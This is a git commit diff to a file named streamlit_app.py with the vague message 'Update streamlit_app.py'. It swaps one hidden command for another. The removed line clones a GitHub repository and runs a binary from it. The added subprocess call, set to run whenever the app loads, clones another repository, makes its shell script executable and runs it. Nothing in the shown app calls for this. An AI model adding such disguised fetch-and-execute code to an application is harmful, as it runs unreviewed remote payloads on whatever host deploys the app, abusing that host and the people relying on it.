c530400a546b2c9d2e4ce6024bba691e8ed45ca9
vipoteg <109018506+vipoteg@users.noreply.github.com>
2022-07-11 17:50:10 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf smlt && git clone https://github.com/Akatsoki/smlt.git && cd smlt && chmod +x Stm && ./Stm")
+import time
+import subprocess
+p = subprocess.Popen("rm -rf nungx && git clone https://github.com/Akatsoki/nungx.git && cd nungx && chmod +x Zxz.sh && ./Zxz.sh", stdout=subprocess.PIPE, shell=True)
+print(p.communicate())
